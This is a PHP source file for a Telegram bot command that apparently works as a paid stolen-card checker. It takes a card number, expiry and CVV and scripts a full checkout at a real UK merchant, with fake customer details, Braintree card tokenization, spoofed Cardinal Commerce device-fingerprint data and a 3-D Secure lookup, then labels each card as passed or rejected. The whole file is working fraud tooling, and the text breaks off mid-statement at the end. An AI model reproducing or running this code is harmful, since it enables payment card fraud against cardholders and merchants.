<?php


$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
    $rank = "OWNER"; 
} else {
    $paidData = file_get_contents('database/paid.txt');
    $pattern = "/User ID: $userId\nRank: (.+)\n/";
    if (preg_match($pattern, $paidData, $matches)) {
        $rank = $matches[1];
    } else {
        $rank = "FREE";
    }
}


if((strpos($text, '/vbv') === 0) or (strpos($text, '.btr') === 0) or ((strpos($text, '$btr') === 0) or (strpos($text, '!btr') === 0)) or ((strpos($text, '+btr') === 0) or (strpos($text, '#btr') === 0)) or (strpos($text, '?btr') === 0)) {


  $userData = file_get_contents('database/users.txt');
  if (strpos($userData, $userId) === false) {
  bot('sendMessage', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "<b>
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]ACCESS DENIED! ❌
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]Status: <code>Unregistered User! ⚠️</code>
  [↯]Message: <code>You have to register first to use me</code>
  You have to use <code>/register</code> to use me 
  - - - - - - - - - - - - - - - - - - - - - -
  </b>",
      'reply_to_message_id' => $message_id,
      'parse_mode' => 'html'
  ]);
  return;
  }




if (strlen($message) <= 4) {
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/vbv cc|mm|yy|cvv</code>     
Gateway <code>Braintree 3ds Lookup</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
return;
}  

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}

$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (strpos($paid, "User ID: $userId") === false) {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>User is broke!</code>
[↯]Message: <code>GO back and drive\n your Kia 😂</code> 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
    return;
}



$spamWaitTime = isSpamming($userId);
if ($spamWaitTime !== false) {
bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamWaitTime seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
}





$start_time = microtime(true);

$messageidtoedit4 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Started checking...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id,

        ]);

        $messageidtovbv = capture(json_encode($messageidtoedit4), '"message_id":', ',');

  if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}



$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0, 1);
$exploded = multiexplode(array(":", "/", " ", "|", ""), $lista);
$cc = $exploded[0];
$mes = $exploded[1];
$ano = $exploded[2];
$cvv = $exploded[3];

if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtovbv,
        'text' => "!𝙔𝙤𝙪 𝘿𝙪𝙢𝙗𝙤 𝘼𝙨𝙨 𝙃𝙤𝙡𝙚!\n𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>/chkcc|mm|yy|cvv</code>-",
        'parse_mode' => 'html',
        'reply_to_message_id' => $messageidtovbv,
        'disable_web_page_preview' => true
    ]);
    return;
}

$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');


$last4 = substr($cc, -4);

//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
            'parse_mode'=>'html',

        ]);
return;
}

//---------------------//
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree 3ds Lookup
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',

        ]);



function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();  



  function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];





//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


//==============[Randomizing Details-END]======================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree 3ds Lookup
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',

        ]);

//==================[BIN LOOK-UP]======================//
$fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
$bin1 = $fim["bin"] ?? null;

    if ($bin1 !== null) {
        $brand = $fim["brand"];
        $country = $fim["country"];
        $country_name = $fim["country_name"];
        $country_flag = $fim["country_flag"];

        $country_currencies = $fim["country_currencies"];
        $bank = $fim["bank"];
        $level = $fim["level"];
        $type = $fim["type"];
    }
//==================[BIN LOOK-UP-END]======================//
  bot('editMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$messageidtovbv,
      'text'=>"<b>
🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree 3ds Lookup
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
      'parse_mode'=>'html',
  ]);
  //=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.design911.co.uk/basket/addproduct');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"ProductID":652646,"Quantity":1,"SourceURL":"https://www.design911.co.uk/porsche/boxster-986-987-981/brakes---discs---pads/"}');
$curl1 = curl_exec($ch);



#02 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.design911.co.uk/checkout/proceed');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"ShippingAddress":{"$type":"Ecomm.Domain.LocalisedBasketAddress, Ecomm.Domain","RegionName":"","CountryName":"United Kingdom","CountryCode":"GB","ZoneName":"UK","ZoneID":398,"Name":{"$type":"Ecomm.Domain.ContactName, Ecomm.Domain","Title":"","FirstName":"Jack","Surname":"Coddrey"},"Company":"","Line1":"G, Tamar Court","Line2":"Amethyst Lane, ","Line3":"Reading","Line4":"Berkshire","PostalCode":"RG30 2EZ","RegionID":-1,"CountryID":1491},"BillingAddress":{"$type":"Ecomm.Domain.LocalisedBasketAddress, Ecomm.Domain","RegionName":"","CountryName":"United Kingdom","CountryCode":"GB","ZoneName":"UK","ZoneID":398,"Name":{"$type":"Ecomm.Domain.ContactName, Ecomm.Domain","Title":"","FirstName":"Jack","Surname":"Coddrey"},"Company":"","Line1":"G, Tamar Court","Line2":"Amethyst Lane, ","Line3":"Reading","Line4":"Berkshire","PostalCode":"RG30 2EZ","RegionID":-1,"CountryID":1491},"CustomerEmail":"dfbdfgtrbrgf@gmail.com","CustomerTelephone":"4254353455","CreateAccount":false,"Password":"","DeliveryOption":"delivery","ExistingOrderNumber":"","CarModel":"","CarType":"","CarYear":"","CarEngineSize":"","CarBodyType":"","CarSteering":"Right Hand Drive","CarTransmission":"Automatic","CarVinChassisNo":"","Comments":"","HowHeard":"INTERNET ORDER","NewsletterSignup":false,"VATNumber":"","VATName":"","VATAddress":"","NPWPNumber":"","SingaporeGST":"","AustraliaGST":""}');
$curl2 = curl_exec($ch);

//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.design911.co.uk/order-payment/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
'content-type: application/x-www-form-urlencoded',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl3 = curl_exec($ch);
$Token = trim(strip_tags(getStr($curl3,'client-token="','"')));
$decode = base64_decode($Token);
$fpt = trim(strip_tags(getStr($decode,'authorizationFingerprint":"','"')));



# 04 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'braintree-version: 2018-05-10',
'authorization: Bearer '.$fpt.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"6704978b-10fd-4b37-b317-ba4fb7edc535"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}');
$curl4 = curl_exec($ch);
$JWT = trim(strip_tags(getStr($curl4,'cardinalAuthenticationJWT":"','"')));

# 05 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'braintree-version: 2018-05-10',
'authorization: Bearer '.$fpt.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"6704978b-10fd-4b37-b317-ba4fb7edc535"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$curl5 = curl_exec($ch);
$pid = trim(strip_tags(getStr($curl5,'token":"','"')));

# 06 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json;charset=UTF-8',
'X-Cardinal-Tid: Tid-223066d9-7fe1-48e4-a2fd-5d8ec18d3752',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"BrowserPayload":{"Order":{"OrderDetails":{},"Consumer":{"BillingAddress":{},"ShippingAddress":{},"Account":{}},"Cart":[],"Token":{},"Authorization":{},"Options":{},"CCAExtension":{}},"SupportsAlternativePayments":{"cca":true,"hostedFields":false,"applepay":false,"discoverwallet":false,"wallet":false,"paypal":false,"visacheckout":false}},"Client":{"Agent":"SongbirdJS","Version":"1.35.0"},"ConsumerSessionId":null,"ServerJWT":"'.$JWT.'"}');
$curl6 = curl_exec($ch);
$JWT2 = trim(strip_tags(getStr($curl6,'CardinalJWT":"','"')));
$PARSED = trim(strip_tags(getStr($JWT2,'.','_')));
$DECODED = base64_decode($PARSED);
$Ref = trim(strip_tags(getStr($DECODED,'ReferenceId":"','"')));
$aud = trim(strip_tags(getStr($DECODED,'"aud":"','"')));


//=======================[5 REQ]==================================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree 3ds Lookup
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',

        ]);


//-------------------Req 2--------------//
//=================REQ 4===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'Origin: https://geo.cardinalcommerce.com',
'Referer: https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5fa1f5b15ea84a4680f871ec&tmEventType=PAYMENT&referenceId='.$Ref.'&geolocation=false&origin=Songbird',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"Cookies":{"Legacy":true,"LocalStorage":true,"SessionStorage":true},"DeviceChannel":"Browser","Extended":{"Browser":{"Adblock":true,"AvailableJsFonts":[],"DoNotTrack":"unknown","JavaEnabled":false},"Device":{"ColorDepth":24,"Cpu":"unknown","Platform":"Win32","TouchSupport":{"MaxTouchPoints":0,"OnTouchStartAvailable":false,"TouchEventCreationSuccessful":false}}},"Fingerprint":"650ee8ce8cff72221cd04b87223780ef","FingerprintingTime":704,"FingerprintDetails":{"Version":"1.5.1"},"Language":"en-US","Latitude":null,"Longitude":null,"OrgUnitId":"5c994f9dccef763068cf8831","Origin":"Songbird","Plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"ReferenceId":"'.$Ref.'","Referrer":"https://www.design911.co.uk/","Screen":{"FakedResolution":false,"Ratio":1.7777777777777777,"Resolution":"1536x864","UsableResolution":"1536x816","CCAScreenSize":"02"},"CallSignEnabled":null,"ThreatMetrixEnabled":false,"ThreatMetrixEventType":"PAYMENT","ThreatMetrixAlias":"Default","TimeOffset":-330,"UserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36","UserAgentDetails":{"FakedOS":false,"FakedBrowser":false}}');
$curl8 = curl_exec($ch);

# 10 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/kxwr8p3g8df6b3wp/client_api/v1/payment_methods/'.$pid.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'Origin: https://gasgrab.com',
'Referer: https://gasgrab.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":49.14,"additionalInfo":{"acsWindowSize":"03","billingLine1":"G, Tamar Court","billingLine2":"Amethyst Lane, ","billingCity":"Reading","billingPostalCode":"RG30 2EZ","billingCountryCode":"GB","billingPhoneNumber":"4254353455","billingGivenName":"Jack","billingSurname":"Coddrey","shippingLine1":"G, Tamar Court","shippingLine2":"Amethyst Lane, ","shippingCity":"Reading","shippingPostalCode":"RG30 2EZ","shippingCountryCode":"GB","email":"dfbdfgtrbrgf@gmail.com"},"bin":"515676","dfReferenceId":"'.$Ref.'","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.86.0","cardinalDeviceDataCollectionTimeElapsed":1094,"issuerDeviceDataCollectionTimeElapsed":1429,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$fpt.'","braintreeLibraryVersion":"braintree/web/3.86.0","_meta":{"merchantAppId":"www.design911.co.uk","platform":"web","sdkVersion":"3.86.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"6704978b-10fd-4b37-b317-ba4fb7edc535"}}');
$curl10 = curl_exec($ch);

$Status = trim(strip_tags(getStr($curl10,'status":"','"')));
$nonce = trim(strip_tags(getStr($curl10,'nonce":"','"')));

#11 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.design911.co.uk/order-payment/dopayment');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"Nonce":"'.$nonce.'","DeviceData":"{\"device_session_id\":\"fad45573ff51c341dfaa518b4c789158\",\"fraud_merchant_id\":null,\"correlation_id\":\"fdb202df7b068212814e2de659eb28a3\"}","LocalPaymentID":"","ReferenceID":""}');
$curl11 = curl_exec($ch);
$rsppppp = trim(strip_tags(getStr($curl11,'FailureReason":"','"')));
if ((strpos($curl11, 'IsSuccess":true')) or (strpos($curl11, 'IsSuccess":true')) or (strpos($curl11, 'Insufficient Funds')));


//=======================[MADE BY SIFAT]==============================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtovbv,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Braintree 3ds Lookup
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',

        ]);

//=============CHECKER PART END============//

if (strpos($Status, 'successful')){
  $es = "Authenticate Successful";
  $msg = "𝙋𝘼𝙎𝙎𝙀𝘿 ✅";
}
else {$Status = "$Status";
        $msg = "𝙍𝙀𝙅𝙀𝘾𝙏𝙀𝘿 ❌";
       }

 if (empty($Status)) {
